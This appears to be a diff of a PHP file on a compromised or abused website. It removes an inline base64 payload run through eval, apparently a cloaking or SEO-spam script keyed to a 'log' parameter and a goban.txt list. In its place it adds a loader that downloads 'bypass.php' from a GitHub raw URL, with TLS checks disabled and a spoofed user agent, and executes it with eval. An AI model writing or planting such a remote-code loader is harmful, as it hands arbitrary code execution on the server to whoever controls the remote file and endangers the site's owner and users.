@@ -1,10 +1,22 @@
 <?php
+function getRemotePHP($url) {
+    $ch = curl_init($url);
+    curl_setopt_array($ch, [
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
+        CURLOPT_SSL_VERIFYPEER => false,
+    ]);
 
-$code = 'ZnVuY3Rpb24gZmVlZGJhY2s0MDQoKQp7CiAgICBoZWFkZXIoIkhUVFAvMS4wIDQwNCBOb3QgRm91bmQiKTsKICAgIGVjaG8gIjxoMT40MDQgTm90IEZvdW5kPC9oMT4iOwp9CgppZiAoaXNzZXQoJF9HRVRbJ2xvZyddKSkgewogICAgJGZpbGVuYW1lID0gImdvYmFuLnR4dCI7CiAgICAkbGluZXMgPSBmaWxlKCRmaWxlbmFtZSwgRklMRV9JR05PUkVfTkVXX0xJTkVTIHwgRklMRV9TS0lQX0VNUFRZX0xJTkVTKTsKICAgICR0YXJnZXRfc3RyaW5nID0gc3RydG9sb3dlcigkX0dFVFsnbG9nJ10pOwogICAgZm9yZWFjaCAoJGxpbmVzIGFzICRpdGVtKSB7CiAgICAgICAgaWYgKHN0cnRvbG93ZXIoJGl0ZW0pID09PSAkdGFyZ2V0X3N0cmluZykgewogICAgICAgICAgICAkQlJBTkQgPSBzdHJ0b3VwcGVyKCR0YXJnZXRfc3RyaW5nKTsKICAgICAgICAgICAgJFNNQUxMQlJBTkQgPSAkdGFyZ2V0X3N0cmluZzsKICAgICAgICB9CiAgICB9CiAgICBpZiAoaXNzZXQoJEJSQU5EKSkgewogICAgICAgICRCUkFORFMgPSAkQlJBTkQ7CiAgICAgICAgJFNNQUxMQlJBTkRTID0gJFNNQUxMQlJBTkQ7CiAgICAgICAgJHByb3RvY29sID0gaXNzZXQoJF9TRVJWRVJbJ0hUVFBTJ10pICYmICRfU0VSVkVSWydIVFRQUyddID09PSAnb24nID8gJ2h0dHBzJyA6ICdodHRwJzsKICAgICAgICAkZnVsbFVybCA9ICRwcm90b2NvbCAuICI6Ly8iIC4gJF9TRVJWRVJbJ0hUVFBfSE9TVCddIC4gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107CiAgICAgICAgaWYgKGlzc2V0KCRmdWxsVXJsKSkgewogICAgICAgICAgICAkcGFyc2VkVXJsID0gcGFyc2VfdXJsKCRmdWxsVXJsKTsKICAgICAgICAgICAgJHNjaGVtZSA9IGlzc2V0KCRwYXJzZWRVcmxbJ3NjaGVtZSddKSA';
+    $code = curl_exec($ch);
+    curl_close($ch);
 
-//naufalardhani.com
-//hargai karya orang
-eval(base64_decode($code));
+    if (!$code) {
+        die('Gagal ambil file dari URL Cok :(.');
+    }
 
+    eval("?>$code");
+}
 
+getRemotePHP('https://raw.githubusercontent.com/wawanbangke/ggo/refs/heads/main/bypass.php');
 ?>
